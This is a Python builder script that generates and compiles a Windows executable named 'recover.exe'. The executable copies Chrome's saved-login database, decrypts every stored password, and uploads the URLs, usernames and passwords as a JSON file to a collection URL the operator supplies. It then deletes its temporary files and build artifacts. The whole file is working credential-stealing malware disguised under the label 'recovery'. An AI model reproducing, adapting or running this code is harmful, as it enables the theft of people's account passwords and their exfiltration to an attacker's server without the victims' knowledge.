import os
import sqlite3
import win32crypt
import sys
import shutil
import json
import requests

c =  open('recover.pyw','w+')
c.write("\n")
c.close()
f = open('recover.pyw','r+',newline=None)
readcontent = f.read()
f.seek(0, 0)
f.write(r'''\

import os
import sqlite3
import win32crypt
import sys
import shutil
import json
import requests

class SQLite3connection:
	def __init__(self,path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			sys.exit()
	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()
	def close(self):
		self.connection.close()

class Recovery:
	def __init__(self):
		src = os.path.realpath(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
		copy = shutil.copy(src,os.getenv("USERPROFILE") + "\\Desktop\\recover.bak")
		self.path = copy
		self.connection = SQLite3connection(self.path)
	def copy(self):
		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
		recovered = []
		if len(data) > 0:
			for result in data:
				url = result[0]
				username = result[1]
				try:
					password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
				except:
					print("None")
					pass
				if password:
					recovered.append({
						"url": url,
						"username": username,
						"password": str(password, 'utf-8')
					})
		else:
			sys.exit()
		self.connection.close()
		os.remove(self.path)
		return recovered
	
def main():
	recovery = Recovery()
	output = recovery.copy()
	with open('data.json', 'w') as fp:
		json.dump(output, fp)
	url = siteLink
	files = {'file': open('data.json', 'rb')}
	r = requests.post(url, files=files)
	os.remove('data.json')
main()
''')	
f.close()
siteLink = input("Please enter the link to your collect file (ex: http://examplesite.com/collect.php)")
a = open('recover.pyw','r+')
readcontent = a.read()
a.seek(0, 0)
a.write('siteLink = ' + "'" + siteLink+ "'" + '\n' + readcontent)
a.close()
print("Building recovery file...")
os.system('pyinstaller --onefile recover.pyw')
os.system('rmdir /S /Q build __pycache__')
os.system('del recover.pyw recover.spec')
print("Saved as dist/recover.exe \n")
dumbInput = input("Press enter to exit. \n")
exit
